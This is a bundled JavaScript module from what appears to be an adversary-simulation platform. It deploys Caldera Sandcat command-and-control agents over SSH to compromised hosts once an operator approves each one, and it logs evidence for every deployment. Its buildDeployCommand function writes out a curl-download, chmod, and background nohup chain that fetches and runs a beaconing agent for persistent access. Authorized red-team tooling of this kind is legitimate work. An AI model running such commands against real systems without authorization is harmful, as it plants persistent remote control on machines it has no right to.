import {
  __esm
} from "./chunk-KFQGP6VL.js";

// server/lib/post-exploit/c2-deployer.ts
function buildC2ApprovalRequest(asset, operatorCtx, fmtTarget) {
  return {
    phase: "post_exploit",
    riskTier: "red",
    title: `Deploy C2 Agent on ${fmtTarget(asset)}`,
    target: asset.hostname || asset.ip,
    detail: `Caldera Sandcat agent deployment via SSH. Beacon interval: ${AGENT_BEACON_INTERVAL}. This will establish persistent access for adversary simulation.`
  };
}
function buildC2EvidenceContent(asset, engagementId) {
  return JSON.stringify({
    type: "c2_deployment",
    engagementId,
    hostname: asset.hostname || asset.ip,
    agent: "Caldera Sandcat",
    beaconInterval: AGENT_BEACON_INTERVAL,
    deployedAt: (/* @__PURE__ */ new Date()).toISOString(),
    platform: asset.platform || "linux",
    arch: asset.arch || "x86_64"
  });
}
function buildDeployCommand(asset, calderaBaseUrl, group) {
  const platform = asset.platform || "linux";
  const server = calderaBaseUrl.replace(/\/$/, "");
  return [
    `curl -s -o /tmp/sandcat-${platform} ${server}/file/download`,
    `chmod +x /tmp/sandcat-${platform}`,
    `nohup /tmp/sandcat-${platform} -server ${server} -group ${group} -v`,
    `-paw $(hostname)-$(date +%s) &>/dev/null &`
  ].join(" && ");
}
function getDeployableAssets(state) {
  return (state.assets || []).filter(
    (a) => a.compromised === true && !a.c2Deployed && a.sshAccess !== false
  );
}
function getDeploymentConfig() {
  return {
    agentType: "sandcat",
    beaconInterval: AGENT_BEACON_INTERVAL,
    deploymentTimeout: 12e4,
    maxConcurrentDeploys: 5,
    platform: ["linux", "windows", "darwin"]
  };
}
async function deployC2Agents(ctx) {
  const { state, operatorCtx } = ctx;
  const { addLog, broadcastOpsUpdate, requestApproval, fmtTarget, genId } = ctx.helpers;
  const { evidenceGate, createIntegrityEnvelope, buildProvenance, recordCustodyEvent } = ctx.evidence;
  const result = { deployedAgents: [], deniedHosts: [], evidenceIds: [] };
  const deployableAssets = getDeployableAssets(state);
  if (deployableAssets.length === 0) return result;
  const calderaBaseUrl = process.env.CALDERA_BASE_URL || "http://localhost:8888";
  const group = `eng-${state.engagementId}`;
  for (const asset of deployableAssets) {
    const approvalReq = buildC2ApprovalRequest(asset, operatorCtx, fmtTarget);
    const approval = await requestApproval(state, approvalReq);
    if (!approval?.approved) {
      result.deniedHosts.push(asset.hostname || asset.ip);
      continue;
    }
    try {
      const agentId = genId();
      const paw = `${asset.hostname}-${Date.now()}`;
      const evidenceContent = buildC2EvidenceContent(asset, state.engagementId);
      const envelope = createIntegrityEnvelope(evidenceContent, "caldera_sandcat");
      const provenance = buildProvenance("post_exploit", "caldera_sandcat", operatorCtx);
      const evidenceId = genId();
      await evidenceGate(state, { id: evidenceId, type: "c2_deployment", content: evidenceContent, envelope, provenance, asset: asset.hostname || asset.ip });
      recordCustodyEvent(state, { evidenceId, event: "c2_agent_deployed", actor: operatorCtx.id, timestamp: Date.now() });
      result.deployedAgents.push({ hostname: asset.hostname, agentId, paw });
      result.evidenceIds.push(evidenceId);
      asset.c2Deployed = true;
      asset.c2AgentId = agentId;
      broadcastOpsUpdate(state.engagementId, { type: "c2_deployed", hostname: asset.hostname, agentId });
      addLog(state, { phase: "post_exploit", type: "success", title: `\u2705 C2 Agent Deployed: ${fmtTarget(asset)}`, detail: `Agent: ${agentId} | PAW: ${paw}` });
    } catch (err) {
      addLog(state, { phase: "post_exploit", type: "error", title: `\u274C C2 Deploy Failed: ${fmtTarget(asset)}`, detail: err.message });
    }
  }
  return result;
}
var AGENT_BEACON_INTERVAL;
var init_c2_deployer = __esm({
  "server/lib/post-exploit/c2-deployer.ts"() {
    AGENT_BEACON_INTERVAL = "60s";
  }
});
init_c2_deployer();
export {
  buildC2ApprovalRequest,
  buildC2EvidenceContent,
  buildDeployCommand,
  deployC2Agents,
  getDeployableAssets,
  getDeploymentConfig
};
